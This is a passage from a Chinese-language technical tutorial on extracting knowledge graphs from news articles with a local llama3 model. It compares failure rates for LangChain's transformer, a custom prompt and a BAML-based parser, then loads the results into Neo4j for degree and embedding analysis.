<p>75%的失败率。这太糟糕了。这意味着在我们的20篇文章样本中，只有5篇成功转换成了知识图谱。</p>
<p>25%的成功率对于任何生产系统来说都是不可接受的。</p>
<p>这就是问题的所在，而且这是一个常见问题。标准方法对于较小LLM略显不可预测的特性来说过于严格。</p>
<hr/>
<h2 data-id="heading-10">改进提示能解决问题吗？</h2>
<p>75%的失败率是个大问题。作为开发者，当LLM表现不佳时，我们的第一反应往往是调整提示。更好的指令应该带来更好的结果，对吧？LLMGraphTransformer内部使用默认提示，但我们无法轻易修改它。</p>
<p>所以，我们用LangChain的ChatPromptTemplate构建自己的简单链。这让我们可以完全控制发送给llama3的指令。我们可以更明确地“引导”模型每次生成正确的JSON格式。</p>
<p>我们先用Pydantic模型定义我们想要的输出结构。这是LangChain中结构化输出的常见模式。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 导入Pydantic模型以定义数据结构  </span>
from langchain_core.pydantic_v1 import BaseModel, Field  
  
<span class="hljs-comment"># 定义一个简单的节点结构  </span>
classNode(BaseModel):  
    id: <span class="hljs-attr">str</span> = Field(description=<span class="hljs-string">"节点的唯一标识符。"</span>)  
    type: <span class="hljs-attr">str</span> = Field(description=<span class="hljs-string">"节点类型（例如，Person, Organization）。"</span>)  
  
<span class="hljs-comment"># 定义一个简单的关系结构  </span>
classRelationship(BaseModel):  
    source: <span class="hljs-attr">Node</span> = Field(description=<span class="hljs-string">"关系的源节点。"</span>)  
    target: <span class="hljs-attr">Node</span> = Field(description=<span class="hljs-string">"关系的目标节点。"</span>)  
    type: <span class="hljs-attr">str</span> = Field(description=<span class="hljs-string">"关系类型（例如，WORKS_FOR）。"</span>)  
  
<span class="hljs-comment"># 定义整体图谱结构  </span>
classKnowledgeGraph(BaseModel):  
    nodes: List<span class="hljs-section">[Node]</span> = Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"图谱中的节点列表。"</span>)  
    relationships: List<span class="hljs-section">[Relationship]</span> = Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"图谱中的关系列表。"</span>)
</code></pre>
<p>接下来，我们创建一个更详细的提示。这个提示将明确包含从Pydantic模型生成的JSON schema，并给LLM非常具体的指令。</p>
<p>我们的目标是尽量减少错误。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 导入提示模板和输出解析器  </span>
from langchain_core.prompts import ChatPromptTemplate  
from langchain_core.output_parsers.json import JsonOutputParser  
  
<span class="hljs-comment"># 创建我们期望输出结构的实例  </span>
<span class="hljs-attr">parser</span> = JsonOutputParser(pydantic_object=KnowledgeGraph)  
  
<span class="hljs-comment"># 创建一个详细的提示模板，包含明确指令  </span>
<span class="hljs-attr">template</span> = <span class="hljs-string">"""  
你是一个顶级算法，擅长以结构化格式提取信息。  
从给定的输入文本中提取知识图谱，包括节点和关系。  
你的目标是尽可能全面，提取所有相关实体及其连接。  
  
将输出格式化为带有'nodes'和'relationships'键的JSON对象。  
严格遵循以下JSON schema：  
{schema}  
  
以下是输入文本：  
--------------------  
{text}  
--------------------  
"""</span>  
  
<span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_template(  
    template,  
    <span class="hljs-attr">partial_variables</span>={<span class="hljs-string">"schema"</span>: parser.get_format_instructions()},  
)  
  
<span class="hljs-comment"># 创建完整的提取链  </span>
<span class="hljs-attr">chain</span> = prompt | llm | parser
</code></pre>
<p>这个新链比LLMGraphTransformer更明确。我们给模型提供了详细的schema和清晰的指令。让我们再次运行20篇文章样本，看看成功率是否有所提高。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 这个列表将存储新结果  </span>
<span class="hljs-attr">graph_documents_prompt_engineered</span> = []  
<span class="hljs-attr">errors</span> = []  
  
for i, row in tqdm(news.head(NUM_ARTICLES).iterrows(), <span class="hljs-attr">total</span>=NUM_ARTICLES, desc=<span class="hljs-string">"使用改进提示处理"</span>):  
    <span class="hljs-attr">text</span> = f<span class="hljs-string">"{row['title']} {row['text']}"</span>  
    try:  
        <span class="hljs-comment"># 调用我们改进的新链  </span>
        <span class="hljs-attr">graph_data</span> = chain.invoke({<span class="hljs-string">"text"</span>: text})  
          
        <span class="hljs-comment"># 手动将解析的JSON转换回GraphDocument格式  </span>
        <span class="hljs-attr">nodes</span> = [Node(id=node[<span class="hljs-string">'id'</span>], type=node[<span class="hljs-string">'type'</span>]) for node in graph_data.get(<span class="hljs-string">'nodes'</span>, [])]  
        <span class="hljs-attr">relationships</span> = [Relationship(source=Node(id=rel[<span class="hljs-string">'source'</span>][<span class="hljs-string">'id'</span>], type=rel[<span class="hljs-string">'source'</span>][<span class="hljs-string">'type'</span>]),  
                                      target=Node(id=rel[<span class="hljs-string">'target'</span>][<span class="hljs-string">'id'</span>], type=rel[<span class="hljs-string">'target'</span>][<span class="hljs-string">'type'</span>]),  
                                      type=rel[<span class="hljs-string">'type'</span>]) for rel in graph_data.get(<span class="hljs-string">'relationships'</span>, [])]  
          
        <span class="hljs-attr">doc</span> = Document(page_content=text)  
        graph_documents_prompt_engineered.append(GraphDocument(<span class="hljs-attr">nodes</span>=nodes, relationships=relationships, source=doc))  
          
    except Exception as e:  
        <span class="hljs-comment"># 如果LLM输出不是有效的JSON，解析器会失败。我们捕获这个错误。  </span>
        errors.append(str(e))  
        <span class="hljs-attr">doc</span> = Document(page_content=text)  
        graph_documents_prompt_engineered.append(GraphDocument(<span class="hljs-attr">nodes</span>=[], relationships=[], source=doc))
</code></pre>
<p>现在是关键时刻。让我们再次检查失败率。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 初始化一个计数器，用于统计没有节点的文档  </span>
empty_count_prompt_engineered = <span class="hljs-number">0</span>  
  
<span class="hljs-comment"># 遍历新结果  </span>
<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> graph_documents_prompt_engineered:  
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> doc.nodes:  
        empty_count_prompt_engineered += <span class="hljs-number">1</span>  
  
<span class="hljs-comment"># 计算并打印新的失败百分比  </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Percentage missing with improved prompt: <span class="hljs-subst">{empty_count_prompt_engineered / <span class="hljs-built_in">len</span>(graph_documents_prompt_engineered) * <span class="hljs-number">100</span>}</span>%"</span>)  
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Number of JSON parsing errors: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(errors)}</span>"</span>)
</code></pre>
<h4 data-id="heading-11">输出</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Percentage</span> missing <span class="hljs-keyword">with</span> improved <span class="hljs-attr">prompt</span>: <span class="hljs-number">62.0</span>%  
<span class="hljs-title class_">Number</span> <span class="hljs-keyword">of</span> <span class="hljs-title class_">JSON</span> parsing <span class="hljs-attr">errors</span>: <span class="hljs-number">13</span>
</code></pre>
<p>结果呢？失败率约为62%。虽然比最初的75%略有改进，但仍远不够可靠。我们仍然无法从20篇文章中的13篇提取图谱。JsonOutputParser每次都抛出错误，因为尽管我们尽力优化了提示，llama3仍然生成了格式错误的JSON。</p>
<p>这表明了一个根本性限制：</p>
<p>仅靠提示工程无法完全解决较小LLM生成不一致结构化输出的问题。</p>
<p>那么，如果更好的提示不是答案，那是什么？我们需要一个工具，不仅要求好的输出，还能聪明地处理LLM给出的不完美输出。这正是BAML设计来解决的问题。</p>
<p>在接下来的部分，我们将用BAML驱动的实现替换整个链，看看它带来的变化。</p>
<hr/>
<h2 data-id="heading-12">BAML的初始化和快速概览</h2>
<p>我们已经确定，即使小心进行提示工程，依赖严格的JSON解析与较小的LLM一起使用是失败的秘诀。模型很强大，但不是完美的格式化工具。</p>
<p>这正是BAML（Basically, A Made-up Language）非常重要的地方。BAML提供了两个关键优势，直接解决了我们的问题：</p>
<ul>
<li>• <strong>简化的Schema</strong>：BAML不用冗长的JSON schema，而是使用类似TypeScript的简洁语法定义数据结构。这对人类和LLM都更容易理解，减少token使用和混淆的可能性。</li>
<li>• <strong>鲁棒的解析</strong>：BAML的客户端带有“模糊”或“schema对齐”的解析器。它不期望完美的JSON，能处理LLM常见的错误，如多余的逗号、缺少引号或多余文本，仍然成功提取数据。</li>
</ul>
<p>首先，你需要安装BAML客户端和它的VS Code扩展。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装BAML客户端  </span>
pip install baml-py
</code></pre>
<p>在VS Code市场中搜索BAML并安装扩展。这个扩展很棒，因为它提供了一个交互式游乐场，让你无需每次运行Python代码即可测试提示和schema。</p>
<p>接下来，我们在一个.baml文件中定义图谱提取逻辑。将其视为LLM调用的配置文件。我们创建一个名为<code>extract_graph.baml</code>的文件：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 定义图谱中的节点，包含ID、类型和可选属性  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">SimpleNode</span> {  
  id <span class="hljs-built_in">string</span>                   <span class="hljs-comment">// 节点的唯一标识符  </span>
  type <span class="hljs-built_in">string</span>                <span class="hljs-comment">// 节点的类型/类别  </span>
  properties Properties      <span class="hljs-comment">// 与节点相关的附加属性  </span>
}  
  
<span class="hljs-comment">// 定义节点或关系的可选属性结构  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">Properties</span> {  
  description <span class="hljs-built_in">string</span>?        <span class="hljs-comment">// 可选的文本描述  </span>
}  
  
<span class="hljs-comment">// 定义两个节点之间的关系  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">SimpleRelationship</span> {  
  source_node_id <span class="hljs-built_in">string</span>      <span class="hljs-comment">// 源节点的ID  </span>
  source_node_type <span class="hljs-built_in">string</span>    <span class="hljs-comment">// 源节点的类型  </span>
  target_node_id <span class="hljs-built_in">string</span>      <span class="hljs-comment">// 目标节点的ID  </span>
  target_node_type <span class="hljs-built_in">string</span>    <span class="hljs-comment">// 目标节点的类型  </span>
  type <span class="hljs-built_in">string</span>                <span class="hljs-comment">// 关系类型（例如，"connects_to", "belongs_to"）  </span>
  properties Properties      <span class="hljs-comment">// 关系的附加属性  </span>
}  
  
<span class="hljs-comment">// 定义包含节点和关系的整体图谱  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">DynamicGraph</span> {  
  nodes SimpleNode[]               <span class="hljs-comment">// 图谱中的所有节点列表  </span>
  relationships SimpleRelationship[] <span class="hljs-comment">// 节点之间的所有关系列表  </span>
}  
  
<span class="hljs-comment">// 从原始输入字符串提取DynamicGraph的函数  </span>
<span class="hljs-function">function <span class="hljs-title">ExtractGraph</span>(<span class="hljs-params">graph: <span class="hljs-built_in">string</span></span>) -&gt; DynamicGraph</span> {  
  client Ollama                   <span class="hljs-comment">// 使用Ollama客户端解释输入  </span>
  prompt <span class="hljs-meta">#"  </span>
    Extract <span class="hljs-keyword">from</span> <span class="hljs-keyword">this</span> content:  
    {{ ctx.output_format }}  
  
    {{ graph }}                           <span class="hljs-comment">// 提示模板，指导Ollama提取图谱  </span>
}
</code></pre>
<p>类定义简单易读。<code>ExtractGraph</code>函数告诉BAML使用Ollama客户端，并提供了一个Jinja提示模板。特殊的<code>{{ ctx.output_format }}</code>变量是BAML自动注入我们简化schema定义的地方。</p>
<hr/>
<h2 data-id="heading-13">将BAML与LangChain集成</h2>
<p>现在，我们将这个BAML函数集成到LangChain工作流程中。我们需要一些辅助函数，将BAML的输出转换为LangChain和Neo4j理解的GraphDocument格式。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 导入必要的库  </span>
<span class="hljs-keyword">from</span> typing importAny, <span class="hljs-type">List</span>  
<span class="hljs-keyword">import</span> baml_client <span class="hljs-keyword">as</span> client  
<span class="hljs-keyword">from</span> langchain_community.graphs.graph_document <span class="hljs-keyword">import</span> GraphDocument, Node, Relationship  
<span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> chain  
  
<span class="hljs-comment"># 辅助函数，正确格式化节点（例如，适当大写）  </span>
def_format_nodes(nodes: <span class="hljs-type">List</span>[Node]) -&gt; <span class="hljs-type">List</span>[Node]:  
    <span class="hljs-keyword">return</span> [  
        Node(  
            <span class="hljs-built_in">id</span>=el.<span class="hljs-built_in">id</span>.title() ifisinstance(el.<span class="hljs-built_in">id</span>, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> el.<span class="hljs-built_in">id</span>,  
            <span class="hljs-built_in">type</span>=el.<span class="hljs-built_in">type</span>.capitalize() <span class="hljs-keyword">if</span> el.typeelseNone,  
            properties=el.properties  
        )  
        <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> nodes  
    ]  
  
<span class="hljs-comment"># 辅助函数，将BAML的关系输出映射到LangChain的Relationship对象  </span>
defmap_to_base_relationship(rel: <span class="hljs-type">Any</span>) -&gt; Relationship:  
    source = Node(<span class="hljs-built_in">id</span>=rel.source_node_id, <span class="hljs-built_in">type</span>=rel.source_node_type)  
    target = Node(<span class="hljs-built_in">id</span>=rel.target_node_id, <span class="hljs-built_in">type</span>=rel.target_node_type)  
    <span class="hljs-keyword">return</span> Relationship(  
        source=source, target=target, <span class="hljs-built_in">type</span>=rel.<span class="hljs-built_in">type</span>, properties=rel.properties  
    )  
  
<span class="hljs-comment"># 主要辅助函数，格式化所有关系  </span>
def_format_relationships(rels) -&gt; <span class="hljs-type">List</span>[Relationship]:  
    relationships = [  
        map_to_base_relationship(rel)  
        <span class="hljs-keyword">for</span> rel <span class="hljs-keyword">in</span> rels  
        <span class="hljs-keyword">if</span> rel.typeand rel.source_node_id <span class="hljs-keyword">and</span> rel.target_node_id  
    ]  
    <span class="hljs-keyword">return</span> [  
        Relationship(  
            source=_format_nodes([el.source])[<span class="hljs-number">0</span>],  
            target=_format_nodes([el.target])[<span class="hljs-number">0</span>],  
            <span class="hljs-built_in">type</span>=el.<span class="hljs-built_in">type</span>.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"_"</span>).upper(),  
            properties=el.properties,  
        )  
        <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> relationships  
    ]  
  
<span class="hljs-comment"># 定义一个LangChain可链式调用的函数，调用我们的BAML函数  </span>
<span class="hljs-meta">@chain  </span>
asyncdefget_graph(message):  
    graph = <span class="hljs-keyword">await</span> client.b.ExtractGraph(graph=message.content)  
    <span class="hljs-keyword">return</span> graph
</code></pre>
<p>让我们了解每个辅助函数的目的：</p>
<ul>
<li>• <code>_format_nodes(nodes)</code>：通过大写ID和类型来标准化节点格式，返回格式整洁的Node对象列表。</li>
<li>• <code>map_to_base_relationship(rel)</code>：将原始BAML关系转换为基本的LangChain Relationship对象，将源和目标包装为Node对象。</li>
<li>• <code>_format_relationships(rels)</code>：过滤无效关系，将其映射到LangChain Relationship对象，并格式化节点类型和关系类型以保持一致性。</li>
<li>• <code>get_graph(message)</code>：一个异步链函数，将输入消息发送到BAML API，调用ExtractGraph，并返回原始图谱输出。</li>
</ul>
<p>有了这些辅助函数，我们可以定义新的处理链。我们将使用一个更简单的自定义提示，因为BAML为我们处理了复杂的schema注入。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 导入提示模板  </span>
from langchain_core.prompts import ChatPromptTemplate  
  
<span class="hljs-comment"># 一个简单有效的系统提示  </span>
<span class="hljs-attr">system_prompt</span> = <span class="hljs-string">"""  
你是一个知识渊博的助手，擅长从文本中提取实体及其关系。  
你的目标是创建知识图谱。  
"""</span>  
  
<span class="hljs-comment"># 最终提示模板  </span>
<span class="hljs-attr">default_prompt</span> = ChatPromptTemplate.from_messages(  
    <span class="hljs-section">[  
        ("system", system_prompt),  
        (  
            "human",  
            (  
                "提示：确保以正确格式回答，不要包含任何解释。 "  
                "使用给定格式从以下输入中提取信息：{input}"  
            ),  
        ),  
    ]</span>  
)  
  
<span class="hljs-comment"># 定义完整的BAML驱动链  </span>
<span class="hljs-attr">chain</span> = default_prompt | llm | get_graph
</code></pre>
<p>这个提示模板指导模型提取实体和关系以构建知识图谱：</p>
<ul>
<li>• <code>system_prompt</code>：将模型角色设置为实体-关系提取器。</li>
<li>• <code>default_prompt</code>：结合系统和人类消息，带有输入文本的占位符。</li>
<li>• <code>chain</code>：通过语言模型运行提示，然后将输出传递给get_graph进行图谱提取。</li>
</ul>
<hr/>
<h2 data-id="heading-14">运行BAML实验</h2>
<p>现在是再次运行实验的时候了。这次我们将处理更大的文章批次，以真正测试新方法的可靠性。</p>
<p>由于时间限制，我在处理344篇文章后停止了执行，但这比最初的20篇样本要稳健得多。</p>
<p>在执行并行处理之前，需要一些辅助函数，我们先来写这些函数。</p>
<pre><code class="hljs language-ini" lang="ini">import asyncio  
  
<span class="hljs-comment"># 异步函数，处理单个文档  </span>
asyncdefaprocess_response(document: Document) -&gt; GraphDocument:  
    <span class="hljs-comment"># 调用我们的BAML链  </span>
    <span class="hljs-attr">resp</span> = await chain.ainvoke({<span class="hljs-string">"input"</span>: document.page_content})  
    <span class="hljs-comment"># 将响应格式化为GraphDocument  </span>
    return GraphDocument(  
        <span class="hljs-attr">nodes</span>=_format_nodes(resp.nodes),  
        <span class="hljs-attr">relationships</span>=_format_relationships(resp.relationships),  
        <span class="hljs-attr">source</span>=document,  
    )  
  
<span class="hljs-comment"># 异步函数，处理文档列表  </span>
asyncdefaconvert_to_graph_documents(  
    documents: List<span class="hljs-section">[Document]</span>,  
) -&gt; List<span class="hljs-section">[GraphDocument]</span>:  
    <span class="hljs-attr">tasks</span> = [asyncio.create_task(aprocess_response(document)) for document in documents]  
    <span class="hljs-attr">results</span> = await asyncio.gather(*tasks)  
    return results  
  
<span class="hljs-comment"># 异步函数，处理原始文本  </span>
asyncdefaprocess_text(texts: List<span class="hljs-section">[str]</span>) -&gt; List<span class="hljs-section">[GraphDocument]</span>:  
    <span class="hljs-attr">docs</span> = [Document(page_content=text) for text in texts]  
    <span class="hljs-attr">graph_docs</span> = await aconvert_to_graph_documents(docs)  
    return graph_docs
</code></pre>
<p>让我们分解每个异步函数的目的：</p>
<ul>
<li>• <code>aprocess_response</code>：处理一个文档并返回GraphDocument。</li>
<li>• <code>aconvert_to_graph_documents</code>：并行处理多个文档并返回图谱结果。</li>
<li>• <code>aprocess_text</code>：将原始文本转换为文档并提取图谱数据。</li>
</ul>
<p>现在，我们可以简单地执行主循环来处理文章。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 初始化一个空列表，存储生成的图谱文档  </span>
<span class="hljs-attr">graph_documents_baml</span> = []  
  
<span class="hljs-comment"># 设置要处理的文章总数  </span>
<span class="hljs-attr">NUM_ARTICLES_BAML</span> = <span class="hljs-number">344</span>  
  
<span class="hljs-comment"># 创建一个仅包含要处理的文章的较小DataFrame  </span>
<span class="hljs-attr">news_baml</span> = news.head(NUM_ARTICLES_BAML)  
  
<span class="hljs-comment"># 从新DataFrame中提取标题和文本  </span>
<span class="hljs-attr">titles</span> = news_baml[<span class="hljs-string">"title"</span>]  
<span class="hljs-attr">texts</span> = news_baml[<span class="hljs-string">"text"</span>]  
  
<span class="hljs-comment"># 定义每批（chunk）处理的文章数量  </span>
<span class="hljs-attr">chunk_size</span> = <span class="hljs-number">4</span>  
  
<span class="hljs-comment"># 使用tqdm显示进度条，逐批迭代文章  </span>
for i in tqdm(range(0, len(titles), chunk_size), <span class="hljs-attr">desc</span>=<span class="hljs-string">"使用BAML处理分块"</span>):  
    <span class="hljs-comment"># 获取当前分块的标题  </span>
    <span class="hljs-attr">title_chunk</span> = titles[i : i + chunk_size]  
    <span class="hljs-comment"># 获取当前分块的文本  </span>
    <span class="hljs-attr">text_chunk</span> = texts[i : i + chunk_size]  
      
    <span class="hljs-comment"># 将每篇文章的标题和文本合并为单个字符串  </span>
    <span class="hljs-attr">combined_docs</span> = [f<span class="hljs-string">"{title} {text}"</span>for title, text inzip(title_chunk, text_chunk)]  
      
    try:  
        <span class="hljs-comment"># 异步处理合并的文档以提取图谱结构  </span>
        <span class="hljs-attr">docs</span> = await aprocess_text(combined_docs)  
        <span class="hljs-comment"># 将处理好的图谱文档添加到主列表  </span>
        graph_documents_baml.extend(docs)  
    except Exception as e:  
        <span class="hljs-comment"># 处理处理过程中发生的任何错误并打印错误消息  </span>
        print(f"处理从索引{i}开始的分块时出错：{e}")  
  
<span class="hljs-comment"># 循环结束后，显示成功处理的图谱文档总数  </span>
len(graph_documents_baml)
</code></pre>
<p>这是我们得到的输出。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 图谱文档总数344</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ff4633b5ca74a788b8dc98c11f79662~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=kKSDJfKg0OIf2j5wh8XJbZKTcVo%3D" alt="" loading="lazy"/></p>
<p>我们处理了344篇文章。现在，让我们运行之前做的失败分析。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 初始化一个计数器，用于统计没有节点的文档  </span>
empty_count_baml = <span class="hljs-number">0</span>  
  
<span class="hljs-comment"># 遍历BAML方法的处理结果  </span>
<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> graph_documents_baml:  
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> doc.nodes:  
        empty_count_baml += <span class="hljs-number">1</span>  
  
<span class="hljs-comment"># 计算并打印新的失败百分比  </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Percentage missing with BAML: <span class="hljs-subst">{empty_count_baml / <span class="hljs-built_in">len</span>(graph_documents_baml) * <span class="hljs-number">100</span>}</span>%"</span>)
</code></pre>
<h4 data-id="heading-15">输出</h4>
<pre><code class="hljs language-csharp" lang="csharp">Percentage missing <span class="hljs-keyword">with</span> BAML: <span class="hljs-number">0.5813953488372093</span>%
</code></pre>
<p>这是一个惊人的结果。我们的失败率从75%下降到仅0.58%。这意味着我们的成功率现在是99.4%！</p>
<p>通过简单地将严格的LLMGraphTransformer替换为BAML驱动的链，我们从一个失败的原型转变为一个稳健的生产就绪流程。</p>
<p>这表明瓶颈不是小型LLM理解任务的能力，而是系统对完美JSON的脆弱期望。</p>
<hr/>
<h2 data-id="heading-16">使用Neo4j分析GraphRAG</h2>
<p>仅仅提取实体是不够的。GraphRAG的真正力量在于结构化这些知识，找到隐藏的联系，并总结相关信息的社区。</p>
<p>我们现在将高质量的图谱数据加载到Neo4j中，并使用图数据科学技术来丰富它。</p>
<p>首先，我们设置与Neo4j数据库的连接。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os  
<span class="hljs-keyword">from</span> langchain_community.graphs <span class="hljs-keyword">import</span> Neo4jGraph  
  
<span class="hljs-comment"># 使用环境变量设置Neo4j连接详情  </span>
os.environ[<span class="hljs-string">"NEO4J_URI"</span>] = <span class="hljs-string">"bolt://localhost:7687"</span>  
os.environ[<span class="hljs-string">"NEO4J_USERNAME"</span>] = <span class="hljs-string">"neo4j"</span>  
os.environ[<span class="hljs-string">"NEO4J_PASSWORD"</span>] = <span class="hljs-string">"your_password"</span> <span class="hljs-comment"># 将此更改为你的密码  </span>
os.environ[<span class="hljs-string">"DATABASE"</span>] = <span class="hljs-string">"graphragdemo"</span>  
  
<span class="hljs-comment"># 初始化Neo4jGraph对象  </span>
graph = Neo4jGraph()
</code></pre>
<p>现在，我们可以将graph_documents_baml添加到数据库中。<code>baseEntityLabel=True</code>参数为所有节点添加<code>__Entity__</code>标签，便于后续查询。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 将图谱文档添加到Neo4j  </span>
graph.add_graph_documents(graph_documents_baml, <span class="hljs-attr">baseEntityLabel</span>=<span class="hljs-literal">True</span>, include_source=<span class="hljs-literal">True</span>)
</code></pre>
<p>数据加载后，我们可以运行一些Cypher查询来了解新知识图谱的结构。让我们从查看文章长度（以token计）和从中提取的实体数量之间的关系开始。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 导入绘图和数据分析的库  </span>
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt  
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns  
  
<span class="hljs-comment"># 查询Neo4j以获取每个文档的实体数量和token数量  </span>
entity_dist = graph.query(  
    <span class="hljs-string">"""  
    MATCH (d:Document)  
    RETURN d.text AS text,  
           count {(d)-[:MENTIONS]-&gt;()} AS entity_count  
    """</span>  
)  
entity_dist_df = pd.DataFrame.from_records(entity_dist)  
entity_dist_df[<span class="hljs-string">"token_count"</span>] = [  
    num_tokens_from_string(<span class="hljs-built_in">str</span>(el)) <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> entity_dist_df[<span class="hljs-string">"text"</span>]  
]  
  
<span class="hljs-comment"># 创建带回归线的散点图  </span>
sns.lmplot(  
    x=<span class="hljs-string">"token_count"</span>, y=<span class="hljs-string">"entity_count"</span>, data=entity_dist_df, line_kws={<span class="hljs-string">"color"</span>: <span class="hljs-string">"red"</span>}  
)  
plt.title(<span class="hljs-string">"实体数量与Token数量分布"</span>)  
plt.xlabel(<span class="hljs-string">"Token数量"</span>)  
plt.ylabel(<span class="hljs-string">"实体数量"</span>)  
plt.show()
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a053bec124964a158da6b89a53df3454~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=PEaR5yQzsb5QsU4LSUpfS93WoIc%3D" alt="" loading="lazy"/></p>
<p><strong>实体数量与Token数量</strong></p>
<p>该图显示了一个明显的正相关：随着文章中token数量的增加，提取的实体数量也倾向于增加。这正是我们期望的，证实了我们的提取过程表现得很合理。</p>
<p>接下来，我们看看节点度分布。这告诉我们实体的连接程度。在现实世界的网络中，少数高度连接的节点（中心节点）是常见的。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np  
  
<span class="hljs-comment"># 查询每个实体节点的度  </span>
degree_dist = graph.query(  
    <span class="hljs-string">"""  
    MATCH (e:__Entity__)  
    RETURN count {(e)-[:!MENTIONS]-()} AS node_degree  
    """</span>  
)  
degree_dist_df = pd.DataFrame.from_records(degree_dist)  
  
<span class="hljs-comment"># 计算统计数据  </span>
mean_degree = np.mean(degree_dist_df[<span class="hljs-string">"node_degree"</span>])  
percentiles = np.percentile(degree_dist_df[<span class="hljs-string">"node_degree"</span>], [<span class="hljs-number">25</span>, <span class="hljs-number">50</span>, <span class="hljs-number">75</span>, <span class="hljs-number">90</span>])  
  
<span class="hljs-comment"># 绘制对数尺度的直方图  </span>
plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">6</span>))  
sns.histplot(degree_dist_df[<span class="hljs-string">"node_degree"</span>], bins=<span class="hljs-number">50</span>, kde=<span class="hljs-literal">False</span>, color=<span class="hljs-string">"blue"</span>)  
plt.yscale(<span class="hljs-string">"log"</span>)  
plt.title(<span class="hljs-string">"节点度分布"</span>)  
plt.legend()  
plt.show()
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c147e0601044927ae85b4efc4e848b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=sjMUDIzq5MwaORQ5SBD4wuqW%2B3A%3D" alt="" loading="lazy"/></p>
<p><strong>节点度分布</strong></p>
<p>直方图显示了一个“长尾”分布，这是知识图谱的典型特征。大多数实体只有少数连接（低度），而少数实体是高度连接的中心节点。</p>
<p>例如，第90百分位的度数是4，但最大度数是37。这表明像“USA”或“Microsoft”这样的实体可能是图谱中的中心点。</p>
<p>为了找到语义上相似的实体（即使名称不同），我们需要为它们创建向量嵌入（embedding）。嵌入是文本的数字表示。我们将为每个实体的ID和描述生成嵌入，并存储在图谱中。</p>
<p>我们将通过Ollama使用llama3模型进行嵌入，并使用LangChain的Neo4jVector来处理这个过程。</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_community.vectorstores import Neo4jVector  
from langchain_ollama import OllamaEmbeddings  
  
<span class="hljs-comment"># 使用本地llama3模型创建嵌入  </span>
<span class="hljs-attr">embeddings</span> = OllamaEmbeddings(model=<span class="hljs-string">"llama3"</span>)  
  
<span class="hljs-comment"># 初始化Neo4jVector实例以管理图谱中的嵌入  </span>
<span class="hljs-attr">vector</span> = Neo4jVector.from_existing_graph(  
    embeddings,  
    <span class="hljs-attr">node_label</span>=<span class="hljs-string">"__Entity__"</span>,  
    <span class="hljs-attr">text_node_properties</span>=[<span class="hljs-string">"id"</span>, <span class="hljs-string">"description"</span>],  
    <span class="hljs-attr">embedding_node_property</span>=<span class="hljs-string">"embedding"</span>,  
    <span class="hljs-attr">database</span>=os.environ[<span class="hljs-string">"DATABASE"</span>],  
)
</code></pre>
<p>此命令遍历Neo4j中的所有<code>__Entity__</code>节点，为其属性生成嵌入，并将其存储回节点的embedding属性中。</p>
<hr/>
<h2 data-id="heading-17">查找和链接相似实体</h2>
<p>有了嵌入，我们现在可以使用k-Nearest Neighbors（kNN）算法找到向量空间中彼此接近的节点。这是识别潜在重复或高度相关实体（例如，“Man United”和“Manchester United”）的强大方法。</p>
<p>我们将使用Neo4j的Graph Data Science（GDS）库来实现这一点。</p>
